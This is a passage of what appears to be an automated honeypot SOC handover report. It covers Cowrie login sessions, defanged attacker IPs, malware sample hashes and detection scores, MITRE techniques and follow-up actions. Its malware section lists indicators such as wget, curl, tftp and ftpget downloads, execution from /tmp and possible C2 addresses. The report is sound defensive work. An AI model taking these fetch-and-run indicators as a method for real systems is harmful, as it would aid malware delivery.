| `2026-07-03 06:35:25` | `cowrie.client.version` |
| `2026-07-03 06:35:26` | `cowrie.client.kex` |
| `2026-07-03 06:35:27` | `cowrie.login.success` |
| `2026-07-03 06:35:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.31.2[.]160` to AbuseIPDB if not already reported
- [ ] Block `125.31.2[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba8ef58cc07a

| Field | Detail |
|---|---|
| **Source IP** | `125.31.2[.]160` |
| **First Seen** | 2026-07-03 06:35 |
| **Last Seen** | 2026-07-03 06:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:35:27` | `cowrie.session.connect` |
| `2026-07-03 06:35:27` | `cowrie.client.version` |
| `2026-07-03 06:35:27` | `cowrie.client.kex` |
| `2026-07-03 06:35:28` | `cowrie.login.success` |
| `2026-07-03 06:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.31.2[.]160` to AbuseIPDB if not already reported
- [ ] Block `125.31.2[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23051ebec834

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 06:40 |
| **Last Seen** | 2026-07-03 06:40 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:40:24` | `cowrie.session.connect` |
| `2026-07-03 06:40:25` | `cowrie.client.version` |
| `2026-07-03 06:40:25` | `cowrie.client.kex` |
| `2026-07-03 06:40:31` | `cowrie.login.success` |
| `2026-07-03 06:40:34` | `cowrie.session.params` |
| `2026-07-03 06:40:34` | `cowrie.command.input` |
| `2026-07-03 06:40:36` | `cowrie.log.closed` |
| `2026-07-03 06:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2623d594231

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-03 06:44 |
| **Last Seen** | 2026-07-03 06:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:44:06` | `cowrie.session.connect` |
| `2026-07-03 06:44:06` | `cowrie.client.version` |
| `2026-07-03 06:44:06` | `cowrie.client.kex` |
| `2026-07-03 06:44:06` | `cowrie.login.success` |
| `2026-07-03 06:44:07` | `cowrie.direct-tcpip.request` |
| `2026-07-03 06:44:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-03 06:44:07` | `cowrie.direct-tcpip.data` |
| `2026-07-03 06:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8456c1567d9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-03 06:44 |
| **Last Seen** | 2026-07-03 06:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:44:07` | `cowrie.session.connect` |
| `2026-07-03 06:44:07` | `cowrie.client.version` |
| `2026-07-03 06:44:07` | `cowrie.client.kex` |
| `2026-07-03 06:44:07` | `cowrie.login.success` |
| `2026-07-03 06:44:07` | `cowrie.direct-tcpip.request` |
| `2026-07-03 06:44:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-03 06:44:07` | `cowrie.direct-tcpip.data` |
| `2026-07-03 06:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59b54ac25cba

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-03 06:48 |
| **Last Seen** | 2026-07-03 06:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:48:17` | `cowrie.session.connect` |
| `2026-07-03 06:48:17` | `cowrie.client.version` |
| `2026-07-03 06:48:18` | `cowrie.client.kex` |
| `2026-07-03 06:48:18` | `cowrie.login.success` |
| `2026-07-03 06:48:19` | `cowrie.session.params` |
| `2026-07-03 06:48:19` | `cowrie.command.input` |
| `2026-07-03 06:48:19` | `cowrie.log.closed` |
| `2026-07-03 06:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb6ebcf961a6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 06:51 |
| **Last Seen** | 2026-07-03 06:51 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:51:35` | `cowrie.session.connect` |
| `2026-07-03 06:51:36` | `cowrie.client.version` |
| `2026-07-03 06:51:36` | `cowrie.client.kex` |
| `2026-07-03 06:51:43` | `cowrie.login.success` |
| `2026-07-03 06:51:46` | `cowrie.session.params` |
| `2026-07-03 06:51:46` | `cowrie.command.input` |
| `2026-07-03 06:51:48` | `cowrie.log.closed` |
| `2026-07-03 06:51:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **21** | 2026-07-03 03:07 | 2026-07-03 06:54 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `51.158.205[.]203` | **6** | 2026-07-03 05:30 | 2026-07-03 05:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | **4** | 2026-07-03 03:37 | 2026-07-03 06:54 | 4m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **3** | 2026-07-03 02:55 | 2026-07-03 03:40 | 2m | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]28` | **2** | 2026-07-03 03:30 | 2026-07-03 03:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]121` | **2** | 2026-07-03 06:15 | 2026-07-03 06:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.254.192[.]213` | **2** | 2026-07-03 06:09 | 2026-07-03 06:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]212` | **2** | 2026-07-03 05:25 | 2026-07-03 05:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]191` | **2** | 2026-07-03 06:50 | 2026-07-03 06:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.12.138[.]190` | 1 | 2026-07-03 06:36 | 2026-07-03 06:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.183[.]241` | 1 | 2026-07-03 06:29 | 2026-07-03 06:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.193.81[.]23` | 1 | 2026-07-03 04:14 | 2026-07-03 04:14 | 14s | 0 | `T1592` | 🟢 LOW |
| `134.122.102[.]174` | 1 | 2026-07-03 03:55 | 2026-07-03 03:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]20` | 1 | 2026-07-03 06:23 | 2026-07-03 06:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.44.26[.]211` | 1 | 2026-07-03 06:33 | 2026-07-03 06:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.206.182[.]202` | 1 | 2026-07-03 03:59 | 2026-07-03 03:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.250.26[.]54` | 1 | 2026-07-03 06:41 | 2026-07-03 06:42 | 30s | 0 | `T1592` | 🟢 LOW |
| `42.51.32[.]228` | 1 | 2026-07-03 06:38 | 2026-07-03 06:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-07-03 04:06 | 2026-07-03 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-07-03 04:34 | 2026-07-03 04:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-07-03 05:36 | 2026-07-03 05:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]122` | 1 | 2026-07-03 03:39 | 2026-07-03 03:39 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]60` | 1 | 2026-07-03 04:56 | 2026-07-03 04:56 | 4s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]144` | 1 | 2026-07-03 06:02 | 2026-07-03 06:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]224` | 1 | 2026-07-03 05:22 | 2026-07-03 05:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-07-03 03:39 | 2026-07-03 03:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]88` | 1 | 2026-07-03 04:00 | 2026-07-03 04:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]156` | 1 | 2026-07-03 06:03 | 2026-07-03 06:03 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 42/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 77/100 | 🔴 HIGH | **19/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `89.21.67[.]156` | NL | Infrawatch Limited | **100** ⚠️ | 32 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 7 |
| `66.132.172[.]212` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 6 |
| `195.206.182[.]202` | GB | Infrawatch Limited | **100** ⚠️ | 22 |
| `66.132.186[.]191` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `220.154.143[.]136` | CN | China Telecom Group Corporation Qingdao Branch | **100** ⚠️ | 7 |
| `194.107.115[.]199` | UZ | State Unitary Enterprise Scientific Engineering and Marketing Researches Center UNICON.UZ | **100** ⚠️ | 50 |
| `193.202.11[.]83` | US | GLOBAL CONNECTIVITY SOLUTIONS LLP | **100** ⚠️ | 0 |
| `106.13.183[.]241` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 31 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 142 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 113 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 18 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 17 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (15 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 190 cases |
| Tool 34  | Credential Extractor        | ✅ 160 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 63 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 15 filtered (7.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 43 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 112 priority case(s) shown individually · 28 recon entry/entries in table (9 group(s) consolidating 44 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-03T07:25:55Z_
